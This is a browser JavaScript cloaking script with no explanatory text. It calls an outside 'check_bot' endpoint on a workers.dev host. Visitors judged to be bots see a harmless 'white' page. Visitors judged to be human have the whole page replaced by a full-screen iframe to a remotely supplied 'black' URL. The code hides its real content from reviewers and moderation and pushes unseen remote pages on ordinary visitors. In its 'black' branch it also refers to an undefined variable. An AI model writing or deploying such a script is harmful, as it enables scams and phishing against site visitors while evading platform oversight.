const createLoader = () => {
  const frame = document.createElement('iframe');
  frame.id = 'load_frame';
  frame.src = `frameLoad.html`;
  frame.frameBorder = 0;
  frame.width = '100%';
  frame.height = '100%';
  frame.style.position = 'fixed';
  frame.style.top = 0;
  frame.style.left = 0;
  frame.style.width = '100%';
  frame.style.height = '100%';
  frame.style.zIndex = 9999;

  const body = document.querySelector('body');
  if (body) {
    body.prepend(frame);
  }
};

const showWhite = () => {
  const body = document.querySelector('body');
  const html = document.documentElement;
  if (body) {
    body.classList.remove('hidden');
    body.removeAttribute('hidden');
    body.style.overflow = 'auto';
  }
  if (html) {
    html.style.overflow = 'auto';
  }


  document.querySelectorAll('style').forEach(styleTag => {
    if (styleTag.textContent.includes('overflow: hidden')) {
      styleTag.textContent = styleTag.textContent.replace(/overflow:\s*hidden;?/g, 'overflow: auto !important;');
    }
  });

  const preload = document.querySelector('#load_frame');
  if (preload) {
    preload.remove();
  }
};

const showBlack = (blackUrl) => {

  document.body.innerHTML = '';
  document.body.style.margin = '0';
  document.body.style.padding = '0';
  document.body.style.overflow = 'hidden';

  const frame = document.createElement('iframe');
  frame.setAttribute('src', blackUrl);
  frame.setAttribute('id', 'wrapper_frame');
  frame.style = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    border: none;
    z-index: 10000;
    display: block;
  `;

  document.body.appendChild(frame);
  body.classList.remove('hidden');
  body.removeAttribute('hidden');

  const style = document.createElement('style');
  style.innerHTML = `
    @media only screen and (max-width: 768px) {
      #wrapper_frame { height: 50vh; }
    }
    @media only screen and (max-width: 480px) {
      #wrapper_frame { height: 30vh; }
    }
  `;
  document.head.appendChild(style);


  setTimeout(() => {
    const preload = document.querySelector('#load_frame');
    if (preload) preload.remove();
  }, 300);
};


createLoader();

window.addEventListener('DOMContentLoaded', () => {
  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot')
    .then(res => res.json())
    .then(res => {
      if (res?.code === 200 && !res.result && res.url) {
       
        showBlack(res.url + '/y7kcGXQt');
      } else {
        
        setTimeout(showWhite, 300);
      }
    })
    .catch(err => {
      console.error('error resp:', err);
      showWhite();
    });
});
